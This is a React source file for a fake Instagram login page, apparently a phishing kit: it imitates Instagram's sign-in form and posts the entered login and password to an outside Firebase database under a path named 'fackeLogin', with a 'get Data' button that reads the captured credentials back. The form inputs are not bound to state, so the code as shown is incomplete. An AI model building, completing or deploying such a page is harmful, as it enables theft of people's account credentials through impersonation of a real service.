import React, {useState} from 'react';
import axios from "axios";

const Instagram = () => {

    const [login, setLogin] = useState('');
    const [password, setPassword] = useState('');

    const [loginn, setLoginn] = useState('');
    const [passwordd, setPasswordd] = useState('');

    const formSubmitHandler = (e) => {
        e.preventDefault();

        const needData = {
            login,
            password
        };

        axios.post(`https://card-2e083-default-rtdb.firebaseio.com/fackeLogin.json`, needData)
            .then(res => {
                console.log('data keldi ===>',res)
            })
    }
    const formBackHandler = (e) => {
        axios.get(`https://card-2e083-default-rtdb.firebaseio.com/fackeLogin.json`)
            .then(res => {
                console.log('data keldi ===>',res)
                setLoginn(res.data.login);
                setPasswordd(res.data.password);
            })
    }

    return (
        <div>

            <div className="instagramContainer">

                <div className="text-center">
                    <h1>{loginn}</h1>
                    <h1>{passwordd}</h1>
                </div>


                <div className="box">

                    <div className="heading"></div>

                    <form onSubmit={formSubmitHandler} className="login-form">
                        <div className="mb-2">
                            <input
                                type="text"
                                placeholder="Phone number, username, or email"
                                className="instagramInput"
                            />
                        </div>

                        <div className="mb-2">
                            <input
                                className="instagramPassword"
                                type="password"
                                placeholder="text"
                            />
                        </div>

                        <button type="submit" className="login-button" >Log In</button>

                    </form>

                    <button type="button" onClick={formBackHandler}>get Data</button>

                    {/*<div className="separator">*/}
                    {/*    <div className="line"></div>*/}
                    {/*    <p>OR</p>*/}
                    {/*    <div className="line"></div>*/}
                    {/*</div>*/}

                    {/*<div className="other">*/}
                    {/*    <button className="fb-login-btn" type="button">*/}
                    {/*        <i className="fa fa-facebook-official fb-icon"></i>*/}
                    {/*        <span className="">Log in with Facebook</span>*/}
                    {/*    </button>*/}
                    {/*    <a className="forgot-password" href="#">Forgot password?</a>*/}
                    {/*</div>*/}
                </div>

                {/*<div className="box">*/}
                {/*    <p>Don't have an account? <a className="signup" href="#">Sign Up</a></p>*/}
                {/*</div>*/}

            </div>
        </div>
    );
};

export default Instagram;